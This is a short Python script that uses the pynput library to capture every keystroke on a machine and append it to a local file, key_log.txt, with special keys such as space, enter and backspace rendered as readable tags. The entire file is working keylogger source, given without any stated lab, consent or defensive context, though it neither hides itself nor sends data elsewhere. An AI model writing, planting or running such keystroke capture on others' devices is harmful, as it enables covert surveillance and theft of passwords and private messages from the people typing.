from pynput.keyboard import Listener

# Define the file where keystrokes will be saved
log_file = "key_log.txt"

# Function to format and write key logs
def on_press(key):
    try:
        # Convert key to string
        key_str = str(key).replace("'", "")
        
        # Log special keys in a readable format
        if key_str == 'Key.space':
            key_str = ' [SPACE] '
        elif key_str == 'Key.enter':
            key_str = ' [ENTER]\n'
        elif key_str == 'Key.tab':
            key_str = ' [TAB] '
        elif key_str == 'Key.backspace':
            key_str = ' [BACKSPACE] '
        elif 'Key' in key_str:
            key_str = f' [{key_str.replace("Key.", "").upper()}] '

        # Write to the log file
        with open(log_file, 'a') as file:
            file.write(key_str)
    
    except Exception as e:
        print(f"Error: {e}")

# Start listening for key presses
with Listener(on_press=on_press) as listener:
    listener.join()
